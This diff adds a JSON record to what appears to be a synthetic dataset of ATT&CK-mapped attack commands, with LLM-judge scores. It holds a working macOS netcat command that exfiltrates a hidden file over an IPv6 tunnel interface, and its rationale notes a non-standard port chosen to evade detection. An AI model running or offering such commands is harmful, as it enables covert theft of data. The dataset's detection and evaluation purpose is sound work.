@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -s \"$(ipconfig getv6ifaddr utun4)\" \"fe80::7:0bad:f00d%utun4\" 55222 < /private/var/tmp/.r",
+  "explanation": "Forces IPv6 TCP exfiltration over a secondary VPN/tunnel interface (utun4) to a link-local address on a high port, using an alternate medium per T1011.",
+  "rationale_steps": [
+    "Retrieve the utun4 IPv6 address with ipconfig to bind the source.",
+    "Send the data using TCP to a scoped link-local destination.",
+    "Use a non-standard port to reduce detection while keeping to the alternate medium."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-f93c25ff",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with valid nc flags, balanced quoting and command substitution, correct IPv6 literals, and proper input redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "It plausibly exfiltrates data over IPv6 via the utun4 interface to a link-local address as described, but it does not implement covert signaling or protocol-field/timing-based signaling typical of T1011, making the technique mapping only partial.",
+        "combined_score": 4.0,
+        "confidence": 0.75,
+        "timestamp": "2025-10-01T17:08:49.212380Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, utilizing valid commands, flags, command substitution, balanced quoting, and proper input redirection for a Bash shell on macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively demonstrates T1011 by forcing IPv6 exfiltration over a specific tunnel interface (utun4) to a link-local address on that interface, creating an 'alternate medium' or 'covert channel' to hide intent or evade monitoring, consistent with signaling or low-bandwidth C2 combined with data transfer.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T17:09:07.284998Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
